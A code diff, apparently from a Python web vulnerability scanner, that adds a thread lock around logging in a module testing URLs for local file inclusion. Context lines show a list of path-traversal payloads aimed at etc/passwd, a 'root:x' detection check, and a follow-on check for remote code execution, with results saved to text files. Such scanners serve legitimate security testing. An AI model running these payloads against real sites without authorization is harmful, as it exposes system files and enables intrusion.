@@ -6,6 +6,8 @@ from urllib3.exceptions import InsecureRequestWarning
 from urllib3 import disable_warnings
 disable_warnings(InsecureRequestWarning)
 
+lock = threading.Lock()
+
 payloads = ['etc/passwd','../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
             '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd',
             '../../../../../../../../etc/passwd']
@@ -31,8 +33,9 @@ class lfi:
         # we need to at-least one param for sending LFI payload, and that's checking it
         if '=' not in url:
             return
-
+        lock.acquire()
         Log.warning("Found link GET Method: " + url)
+        lock.release()
 
         # Skip mailto and tel protocol too
         if not url.startswith("mailto:") and not url.startswith("tel:"):
@@ -43,10 +46,14 @@ class lfi:
 
                     # checks is that has vulnerability or not
                     if  'root:x' in req.text:
+                        lock.acquire()
                         Log.high("Detected LFI at " + req.url)
+                        lock.release()
+
                         file = open("lfi.txt", "a+")
                         file.write(str(req.url) + "\n")
                         file.close()
+
 
                         ########### RCE IN LFI ###########
 
@@ -64,7 +71,9 @@ class lfi:
                         # exists to our page, we can confrim we have acess to their server by RCE vulnerability
 
                         if '87db16cba59e908888837d351af65bfe' in rce_req.text:
+                            lock.acquire()
                             Log.high("Detected RCE in LFI at " + rce_req.url)
+                            lock.release()
                             file = open("rce_in_lfi.txt", "a+")
                             file.write(str(req.url) + "\n")
                             file.close()
